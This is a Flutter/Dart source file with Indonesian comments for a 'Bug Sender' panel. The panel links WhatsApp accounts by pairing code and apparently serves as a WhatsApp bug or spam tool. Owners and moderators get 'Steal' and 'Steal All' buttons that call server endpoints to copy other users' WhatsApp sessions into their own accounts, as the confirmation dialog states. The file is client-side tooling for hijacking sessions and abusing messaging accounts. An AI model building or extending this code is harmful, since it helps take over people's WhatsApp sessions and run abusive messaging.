// bug_sender.dart - DEATH X-FLOID EDITION 💀🔥
// Steal Sender hanya untuk Owner & Moderator
// Target curian: Member, Reseller, Partner, TK
// Modified by TANZ AI V8 for Professor KenzMD

import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'services/api_config_service.dart';

// ============ WARNA NEON DEATH X-FLOID ============
const Color neonCyan = Color(0xFF00E5FF);
const Color neonMagenta = Color(0xFFFF1744);
const Color deepBlack = Color(0xFF070B12);
const Color darkPurple = Color(0xFF1A1A2E);
const Color cardBlack = Color(0xFF0F0F1A);
const Color glassPurple = Color(0xFF2D1B4E);
const Color neonYellow = Color(0xFFFFE600);
const Color neonPurple = Color(0xFF9C4DCC);

class BugSenderPage extends StatefulWidget {
  final String sessionKey;
  final String username;
  final String role;

  const BugSenderPage({
    super.key,
    required this.sessionKey,
    required this.username,
    required this.role,
  });

  @override
  State<BugSenderPage> createState() => _BugSenderPageState();
}

class _BugSenderPageState extends State<BugSenderPage> with SingleTickerProviderStateMixin {
  List<dynamic> senderList = [];
  List<dynamic> globalSenderList = [];
  List<dynamic> userList = [];
  bool isLoading = false;
  bool isRefreshing = false;
  bool isLoadingGlobal = false;
  bool isLoadingUsers = false;
  String? errorMessage;
  String? globalErrorMessage;
  
  late TabController _tabController;
  int _currentTabIndex = 0;

  // ✅ Cek apakah user memiliki izin untuk steal (ONLY OWNER & MODERATOR)
  bool get canSteal => 
      widget.role.toLowerCase() == "owner" || 
      widget.role.toLowerCase() == "moderator" ||
      widget.role.toLowerCase() == "pemilikan";

  // ✅ Role yang BISA DICURI (Member, Reseller, Partner, TK)
  final List<String> _stealableRoles = ['member', 'reseller', 'partner', 'tk'];
  
  // ✅ Role yang TIDAK BISA DICURI
  final List<String> _unstealableRoles = ['owner', 'moderator', 'pt', 'pemilikan'];

  // Warna Neon untuk role
  final Color roleOwner = neonYellow;
  final Color roleModerator = neonMagenta;
  final Color rolePT = neonPurple;
  final Color roleTK = neonCyan;
  final Color rolePartner = const Color(0xFF00BFA5);
  final Color roleReseller = const Color(0xFF4CAF50);
  final Color roleMember = Colors.grey;

  final ApiConfigService _apiService = ApiConfigService();

  @override
  void initState() {
    super.initState();
    int tabCount = canSteal ? 3 : 2;
    _tabController = TabController(length: tabCount, vsync: this);
    _tabController.addListener(() {
      setState(() {
        _currentTabIndex = _tabController.index;
      });
      if (_currentTabIndex == 1 && globalSenderList.isEmpty && !isLoadingGlobal) {
        _fetchGlobalSenders();
      }
      if (canSteal && _currentTabIndex == 2 && userList.isEmpty && !isLoadingUsers) {
        _fetchAllUsers();
      }
    });
    _fetchSenders();
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  Future<void> _fetchSenders() async {
    setState(() {
      isLoading = true;
      errorMessage = null;
    });

    try {
      final baseUrl = await _apiService.getBaseUrl();
      final response = await http.get(
        Uri.parse("$baseUrl/mySender?key=${widget.sessionKey}"),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data["valid"] == true) {
          setState(() {
            senderList = data["connections"] ?? [];
          });
        } else {
          setState(() {
            errorMessage = data["message"] ?? "Failed to fetch senders";
          });
        }
      } else {
        setState(() {
          errorMessage = "Server error: ${response.statusCode}";
        });
      }
    } catch (e) {
      setState(() {
        errorMessage = "Connection failed: $e";
      });
    } finally {
      setState(() {
        isLoading = false;
        isRefreshing = false;
      });
    }
  }

  Future<void> _fetchGlobalSenders() async {
    setState(() {
      isLoadingGlobal = true;
      globalErrorMessage = null;
    });

    try {
      final baseUrl = await _apiService.getBaseUrl();
      final response = await http.get(
        Uri.parse("$baseUrl/globalSenders?key=${widget.sessionKey}"),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data["valid"] == true) {
          setState(() {
            globalSenderList = data["senders"] ?? [];
          });
        } else {
          setState(() {
            globalErrorMessage = data["message"] ?? "Failed to fetch global senders";
          });
        }
      } else {
        setState(() {
          globalErrorMessage = "Server error: ${response.statusCode}";
        });
      }
    } catch (e) {
      setState(() {
        globalErrorMessage = "Connection failed: $e";
      });
    } finally {
      setState(() {
        isLoadingGlobal = false;
      });
    }
  }

  Future<void> _fetchAllUsers() async {
    setState(() {
      isLoadingUsers = true;
    });

    try {
      final baseUrl = await _apiService.getBaseUrl();
      final response = await http.get(
        Uri.parse("$baseUrl/allUsers?key=${widget.sessionKey}"),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data["valid"] == true) {
          setState(() {
            userList = data["users"] ?? [];
            userList = userList.where((u) => 
              u['username'] != widget.username && 
              _stealableRoles.contains(u['role']?.toString().toLowerCase())
            ).toList();
          });
        }
      }
    } catch (e) {
      print("Error fetching users: $e");
    } finally {
      setState(() {
        isLoadingUsers = false;
      });
    }
  }

  bool _canStealFromRole(String targetRole) {
    return _stealableRoles.contains(targetRole.toLowerCase());
  }

  Color _getRoleColor(String role) {
    switch (role.toLowerCase()) {
      case 'owner': return roleOwner;
      case 'moderator': return roleModerator;
      case 'pt': return rolePT;
      case 'tk': return roleTK;
      case 'partner': return rolePartner;
      case 'reseller': return roleReseller;
      case 'member': return roleMember;
      default: return Colors.grey;
    }
  }

  Future<void> _stealSender(String owner, String session, String targetRole) async {
    if (!canSteal) {
      _showSnackBar("Anda tidak memiliki izin untuk mencuri sender!", isError: true);
      return;
    }

    if (!_canStealFromRole(targetRole)) {
      _showSnackBar("Tidak bisa mencuri sender dari user dengan role $targetRole!", isError: true);
      return;
    }

    final confirmed = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardBlack,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: neonCyan.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Icon(Icons.content_copy, color: neonCyan),
            const SizedBox(width: 12),
            Text("Steal Sender", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Text(
          "Yakin ingin mencuri sender '$session' milik $owner (Role: $targetRole)?",
          style: const TextStyle(color: Colors.white70),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: Text("BATAL", style: TextStyle(color: neonMagenta)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: neonCyan.withOpacity(0.2),
              foregroundColor: neonCyan,
            ),
            onPressed: () => Navigator.pop(context, true),
            child: Text("STEAL", style: TextStyle(color: neonCyan)),
          ),
        ],
      ),
    );

    if (confirmed == true) {
      setState(() => isLoading = true);

      try {
        final baseUrl = await _apiService.getBaseUrl();
        final response = await http.get(
          Uri.parse("$baseUrl/stealSender?key=${widget.sessionKey}&owner=$owner&session=$session"),
        );

        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data["valid"] == true) {
            _showSnackBar(data["message"] ?? "Berhasil mencuri sender dari $owner!", isError: false);
            await _fetchSenders();
            await _fetchGlobalSenders();
            await _fetchAllUsers();
          } else {
            _showSnackBar(data["message"] ?? "Gagal mencuri sender", isError: true);
          }
        } else {
          _showSnackBar("Server error: ${response.statusCode}", isError: true);
        }
      } catch (e) {
        _showSnackBar("Connection failed: $e", isError: true);
      } finally {
        setState(() => isLoading = false);
      }
    }
  }

  Future<void> _stealAllFromUser(String targetOwner, String targetRole) async {
    if (!canSteal) {
      _showSnackBar("Anda tidak memiliki izin untuk mencuri sender!", isError: true);
      return;
    }

    if (!_canStealFromRole(targetRole)) {
      _showSnackBar("Tidak bisa mencuri sender dari user dengan role $targetRole!", isError: true);
      return;
    }

    final confirmed = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardBlack,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: neonPurple.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Icon(Icons.copy_all, color: neonPurple),
            const SizedBox(width: 12),
            Text("Steal All Senders", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Text(
          "Yakin ingin mencuri SEMUA sender milik $targetOwner (Role: $targetRole)?\n\nTindakan ini akan menyalin semua session WhatsApp mereka ke akun Anda!",
          style: const TextStyle(color: Colors.white70),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: Text("BATAL", style: TextStyle(color: neonMagenta)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: neonPurple.withOpacity(0.2),
              foregroundColor: neonPurple,
            ),
            onPressed: () => Navigator.pop(context, true),
            child: Text("STEAL ALL", style: TextStyle(color: neonPurple)),
          ),
        ],
      ),
    );

    if (confirmed == true) {
      setState(() => isLoading = true);

      try {
        final baseUrl = await _apiService.getBaseUrl();
        final response = await http.get(
          Uri.parse("$baseUrl/stealAllSenders?key=${widget.sessionKey}&targetOwner=$targetOwner"),
        );

        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data["valid"] == true) {
            _showSnackBar(data["message"] ?? "Berhasil mencuri semua sender dari $targetOwner!", isError: false);
            await _fetchSenders();
            await _fetchGlobalSenders();
            await _fetchAllUsers();
          } else {
            _showSnackBar(data["message"] ?? "Gagal mencuri sender", isError: true);
          }
        } else {
          _showSnackBar("Server error: ${response.statusCode}", isError: true);
        }
      } catch (e) {
        _showSnackBar("Connection failed: $e", isError: true);
      } finally {
        setState(() => isLoading = false);
      }
    }
  }

  Future<void> _refreshAll() async {
    setState(() => isRefreshing = true);
    await _fetchSenders();
    await _fetchGlobalSenders();
    if (canSteal) await _fetchAllUsers();
    setState(() => isRefreshing = false);
  }

  void _showAddSenderDialog() {
    final phoneController = TextEditingController();

    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardBlack,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: neonCyan.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Icon(Icons.add_circle, color: neonCyan),
            const SizedBox(width: 12),
            Text("Add New Sender", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ],
        ),
        content: TextField(
          controller: phoneController,
          keyboardType: TextInputType.phone,
          style: const TextStyle(color: Colors.white),
          decoration: InputDecoration(
            labelText: "Phone Number",
            labelStyle: TextStyle(color: neonCyan),
            hintText: "62xxx",
            hintStyle: const TextStyle(color: Colors.white54),
            prefixIcon: Icon(Icons.phone, color: neonCyan),
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: neonCyan),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: neonCyan),
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("CANCEL", style: TextStyle(color: neonMagenta)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: neonCyan,
              foregroundColor: deepBlack,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            ),
            onPressed: () async {
              final number = phoneController.text.trim();
              if (number.isEmpty) {
                _showSnackBar("Please enter phone number", isError: true);
                return;
              }
              Navigator.pop(context);
              await _addSender(number);
            },
            child: const Text("ADD SENDER"),
          ),
        ],
      ),
    );
  }

  Future<void> _addSender(String number) async {
    setState(() => isLoading = true);

    try {
      final baseUrl = await _apiService.getBaseUrl();
      final response = await http.get(
        Uri.parse("$baseUrl/getPairing?key=${widget.sessionKey}&number=$number"),
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data["valid"] == true) {
          _showPairingCodeDialog(number, data['pairingCode']);
          _showSnackBar("Pairing code generated successfully!", isError: false);
        } else {
          _showSnackBar(data['message'] ?? "Failed to generate pairing code", isError: true);
        }
      } else {
        _showSnackBar("Server error: ${response.statusCode}", isError: true);
      }
    } catch (e) {
      _showSnackBar("Connection failed: $e", isError: true);
    } finally {
      setState(() => isLoading = false);
      _fetchSenders();
    }
  }

  void _showPairingCodeDialog(String number, String code) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: cardBlack,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: neonCyan.withOpacity(0.5)),
        ),
        title: Column(
          children: [
            Icon(Icons.qr_code_2, color: neonCyan, size: 50),
            const SizedBox(height: 10),
            Text("Pairing Required", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: deepBlack.withOpacity(0.5),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: neonCyan.withOpacity(0.3)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text("Number: $number", style: const TextStyle(color: Colors.white)),
              const SizedBox(height: 20),
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: deepBlack,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: neonCyan),
                  gradient: LinearGradient(
                    colors: [neonCyan.withOpacity(0.1), Colors.transparent],
                  ),
                ),
                child: Text(
                  code,
                  style: TextStyle(
                    color: neonCyan,
                    fontSize: 32,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 4,
                    fontFamily: 'Courier',
                  ),
                ),
              ),
              const SizedBox(height: 16),
              Text(
                "Open WhatsApp → Settings → Linked Devices → Link a Device\nEnter this code to complete pairing",
                textAlign: TextAlign.center,
                style: const TextStyle(color: Colors.white70, fontSize: 12),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("CLOSE", style: TextStyle(color: neonCyan)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: neonCyan,
              foregroundColor: deepBlack,
            ),
            onPressed: () {
              Navigator.pop(context);
              _fetchSenders();
            },
            child: const Text("REFRESH LIST"),
          ),
        ],
      ),
    );
  }

  Future<void> _deleteSender(String senderId) async {
    final confirmed = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardBlack,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: neonMagenta.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Icon(Icons.warning, color: neonMagenta),
            const SizedBox(width: 12),
            Text("Confirm Delete", style: TextStyle(color: Colors.white)),
          ],
        ),
        content: const Text("Are you sure you want to delete this sender?", style: TextStyle(color: Colors.white70)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: Text("CANCEL", style: TextStyle(color: neonCyan)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: neonMagenta.withOpacity(0.2),
              foregroundColor: neonMagenta,
            ),
            onPressed: () => Navigator.pop(context, true),
            child: Text("DELETE", style: TextStyle(color: neonMagenta)),
          ),
        ],
      ),
    );

    if (confirmed == true) {
      setState(() => isLoading = true);
      try {
        final baseUrl = await _apiService.getBaseUrl();
        final response = await http.delete(Uri.parse("$baseUrl/deleteSender?key=${widget.sessionKey}&id=$senderId"));
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data["valid"] == true) {
            _showSnackBar("Sender deleted successfully!", isError: false);
            _fetchSenders();
          } else {
            _showSnackBar(data["message"] ?? "Failed to delete sender", isError: true);
          }
        }
      } catch (e) {
        _showSnackBar("Connection failed: $e", isError: true);
      } finally {
        setState(() => isLoading = false);
      }
    }
  }

  void _showSnackBar(String message, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: isError ? neonMagenta : neonCyan,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
  }

  Widget _buildTabBar() {
    List<Widget> tabs = [
      const Tab(text: "MY SENDERS"),
      const Tab(text: "GLOBAL"),
    ];
    
    if (canSteal) {
      tabs.add(const Tab(text: "STEAL ALL"));
    }
    
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      height: 45,
      decoration: BoxDecoration(
        color: cardBlack,
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: neonCyan.withOpacity(0.3)),
      ),
      child: TabBar(
        controller: _tabController,
        indicator: BoxDecoration(
          color: neonCyan.withOpacity(0.2),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: neonCyan),
        ),
        labelColor: neonCyan,
        unselectedLabelColor: Colors.white54,
        labelStyle: const TextStyle(fontWeight: FontWeight.bold, fontSize: 11),
        tabs: tabs,
      ),
    );
  }

  Widget _buildMySendersTab() {
    if (isLoading && senderList.isEmpty) return const Center(child: CircularProgressIndicator(color: neonCyan));
    if (errorMessage != null && senderList.isEmpty) return _buildErrorState();
    if (senderList.isEmpty) return _buildEmptyState();
    
    return RefreshIndicator(
      color: neonCyan,
      onRefresh: _fetchSenders,
      child: ListView.builder(
        physics: const AlwaysScrollableScrollPhysics(),
        itemCount: senderList.length,
        itemBuilder: (context, index) => _buildSenderCard(senderList[index]),
      ),
    );
  }

  Widget _buildGlobalSendersTab() {
    if (isLoadingGlobal && globalSenderList.isEmpty) return const Center(child: CircularProgressIndicator(color: neonCyan));
    if (globalErrorMessage != null && globalSenderList.isEmpty) return _buildGlobalErrorState();
    if (globalSenderList.isEmpty) return _buildGlobalEmptyState();
    
    return RefreshIndicator(
      color: neonCyan,
      onRefresh: _fetchGlobalSenders,
      child: ListView.builder(
        physics: const AlwaysScrollableScrollPhysics(),
        itemCount: globalSenderList.length,
        itemBuilder: (context, index) => _buildGlobalSenderCard(globalSenderList[index]),
      ),
    );
  }

  Widget _buildStealAllTab() {
    if (!canSteal) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.lock, color: neonMagenta, size: 80),
            const SizedBox(height: 20),
            Text("Access Denied", style: TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
            const SizedBox(height: 12),
            Text(
              "Fitur ini hanya untuk Owner & Moderator", 
              style: const TextStyle(color: Colors.white54, fontSize: 14),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      );
    }
    
    if (isLoadingUsers && userList.isEmpty) return const Center(child: CircularProgressIndicator(color: neonCyan));
    if (userList.isEmpty) return _buildNoUsersState();
    
    return RefreshIndicator(
      color: neonCyan,
      onRefresh: _fetchAllUsers,
      child: ListView.builder(
        physics: const AlwaysScrollableScrollPhysics(),
        itemCount: userList.length,
        itemBuilder: (context, index) {
          final user = userList[index];
          final targetName = user['username'];
          final targetRole = user['role'] ?? 'member';
          final roleColor = _getRoleColor(targetRole);
          
          return Card(
            margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            color: cardBlack,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(16),
              side: BorderSide(color: roleColor.withOpacity(0.3)),
            ),
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(
                      color: roleColor.withOpacity(0.2), 
                      shape: BoxShape.circle, 
                      border: Border.all(color: roleColor.withOpacity(0.5)),
                    ),
                    child: Icon(Icons.person, color: roleColor),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(targetName, style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 4),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                          decoration: BoxDecoration(
                            color: roleColor.withOpacity(0.2), 
                            borderRadius: BorderRadius.circular(8),
                          ),
                          child: Text(
                            targetRole.toUpperCase(), 
                            style: TextStyle(color: roleColor, fontSize: 10, fontWeight: FontWeight.bold),
                          ),
                        ),
                      ],
                    ),
                  ),
                  ElevatedButton.icon(
                    icon: Icon(Icons.copy_all, size: 16),
                    label: const Text("STEAL ALL"),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: neonPurple.withOpacity(0.2),
                      foregroundColor: neonPurple,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                    onPressed: () => _stealAllFromUser(targetName, targetRole),
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildSenderCard(Map<String, dynamic> sender) {
    final name = sender['sessionName'] ?? 'Unnamed';
    return Card(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      color: cardBlack,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
        side: BorderSide(color: neonCyan.withOpacity(0.3)),
      ),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: neonCyan.withOpacity(0.2),
                shape: BoxShape.circle,
              ),
              child: Icon(Icons.phone_android, color: neonCyan),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Text(name, style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
            ),
            Row(
              children: [
                OutlinedButton.icon(
                  icon: Icon(Icons.refresh, size: 16),
                  label: const Text("REFRESH"),
                  style: OutlinedButton.styleFrom(
                    foregroundColor: neonCyan,
                    side: BorderSide(color: neonCyan),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                  ),
                  onPressed: _fetchSenders,
                ),
                const SizedBox(width: 12),
                ElevatedButton.icon(
                  icon: Icon(Icons.delete, size: 16),
                  label: const Text("DELETE"),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: neonMagenta.withOpacity(0.2),
                    foregroundColor: neonMagenta,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                  ),
                  onPressed: () => _deleteSender(sender['id']),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildGlobalSenderCard(Map<String, dynamic> sender) {
    final name = sender['sessionName'] ?? 'Unnamed';
    final owner = sender['owner'] ?? 'Unknown';
    final ownerRole = sender['ownerRole'] ?? 'member';
    final isMine = sender['isMine'] == true;
    
    final canStealThis = canSteal && !isMine && _canStealFromRole(ownerRole);
    final roleColor = _getRoleColor(ownerRole);
    
    return Card(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      color: cardBlack,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
        side: BorderSide(color: isMine ? neonCyan : neonYellow.withOpacity(0.3)),
      ),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: isMine ? neonCyan.withOpacity(0.2) : neonYellow.withOpacity(0.2),
                    shape: BoxShape.circle,
                    border: Border.all(color: isMine ? neonCyan : neonYellow),
                  ),
                  child: Icon(isMine ? Icons.person : Icons.public, color: isMine ? neonCyan : neonYellow),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(name, style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
                      const SizedBox(height: 4),
                      Row(
                        children: [
                          Text("Owner: $owner", style: TextStyle(color: isMine ? neonCyan : neonYellow, fontSize: 11)),
                          const SizedBox(width: 8),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                            decoration: BoxDecoration(
                              color: roleColor.withOpacity(0.2),
                              borderRadius: BorderRadius.circular(4),
                            ),
                            child: Text(
                              ownerRole.toUpperCase(),
                              style: TextStyle(color: roleColor, fontSize: 9, fontWeight: FontWeight.bold),
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
                if (!isMine && canStealThis)
                  ElevatedButton.icon(
                    icon: Icon(Icons.content_copy, size: 16),
                    label: const Text("STEAL"),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: neonYellow.withOpacity(0.2),
                      foregroundColor: neonYellow,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                    onPressed: () => _stealSender(owner, name, ownerRole),
                  ),
                if (!isMine && !canStealThis)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                    decoration: BoxDecoration(
                      color: Colors.grey.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: Colors.grey.withOpacity(0.3)),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.lock, color: Colors.grey, size: 12),
                        const SizedBox(width: 4),
                        const Text(
                          "LOCKED",
                          style: TextStyle(color: Colors.grey, fontSize: 10, fontWeight: FontWeight.bold),
                        ),
                      ],
                    ),
                  ),
                if (isMine)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                    decoration: BoxDecoration(
                      color: neonCyan.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: neonCyan.withOpacity(0.3)),
                    ),
                    child: Text("MINE", style: TextStyle(color: neonCyan, fontSize: 10, fontWeight: FontWeight.bold)),
                  ),
              ],
            ),
            if (!isMine && !canStealThis)
              Padding(
                padding: const EdgeInsets.only(top: 8),
                child: Text(
                  "⚠️ Tidak bisa mencuri dari role $ownerRole",
                  style: const TextStyle(color: Colors.grey, fontSize: 10),
                ),
              ),
          ],
        ),
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.phone_iphone, color: neonCyan, size: 80),
          const SizedBox(height: 20),
          Text("No Senders Found", style: TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
          const SizedBox(height: 30),
          ElevatedButton.icon(
            icon: const Icon(Icons.add),
            label: const Text("ADD FIRST SENDER"),
            style: ElevatedButton.styleFrom(
              backgroundColor: neonCyan,
              foregroundColor: deepBlack,
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 16),
            ),
            onPressed: _showAddSenderDialog,
          ),
        ],
      ),
    );
  }

  Widget _buildGlobalEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.public, color: neonYellow, size: 80),
          const SizedBox(height: 20),
          Text("No Global Senders", style: TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  Widget _buildNoUsersState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.people, color: neonPurple, size: 80),
          const SizedBox(height: 20),
          Text("No Targets Available", style: TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
          const SizedBox(height: 12),
          const Text(
            "Tidak ada user dengan role Member, Reseller, Partner, TK yang bisa dicuri", 
            style: TextStyle(color: Colors.white54, fontSize: 14),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }

  Widget _buildErrorState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.error_outline, color: neonMagenta, size: 80),
          const SizedBox(height: 20),
          Text("Failed to Load", style: TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
          const SizedBox(height: 30),
          ElevatedButton.icon(
            icon: const Icon(Icons.refresh),
            label: const Text("TRY AGAIN"),
            style: ElevatedButton.styleFrom(
              backgroundColor: neonCyan,
              foregroundColor: deepBlack,
            ),
            onPressed: _fetchSenders,
          ),
        ],
      ),
    );
  }

  Widget _buildGlobalErrorState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.error_outline, color: neonMagenta, size: 80),
          const SizedBox(height: 20),
          Text("Failed to Load Global Senders", style: TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
          const SizedBox(height: 30),
          ElevatedButton.icon(
            icon: const Icon(Icons.refresh),
            label: const Text("TRY AGAIN"),
            style: ElevatedButton.styleFrom(
              backgroundColor: neonCyan,
              foregroundColor: deepBlack,
            ),
            onPressed: _fetchGlobalSenders,
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    String title = "Bug Sender";
    if (!canSteal) {
      title = "Bug Sender (Read Only)";
    } else if (widget.role.toLowerCase() == "moderator") {
      title = "Bug Sender (Moderator)";
    } else if (widget.role.toLowerCase() == "owner") {
      title = "Bug Sender (Owner)";
    }
    
    return Scaffold(
      backgroundColor: deepBlack,
      appBar: AppBar(
        title: Text(
          title,
          style: TextStyle(
            color: neonCyan,
            fontWeight: FontWeight.bold,
          ),
        ),
        backgroundColor: cardBlack,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
        actions: [
          IconButton(
            icon: Icon(Icons.refresh, color: neonCyan),
            onPressed: _refreshAll,
          ),
        ],
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(50),
          child: _buildTabBar(),
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          _buildMySendersTab(),
          _buildGlobalSendersTab(),
          if (canSteal) _buildStealAllTab(),
        ],
      ),
      floatingActionButton: _currentTabIndex == 0
          ? FloatingActionButton(
              backgroundColor: neonCyan,
              onPressed: _showAddSenderDialog,
              child: const Icon(Icons.add, color: deepBlack),
            )
          : null,
    );
  }
}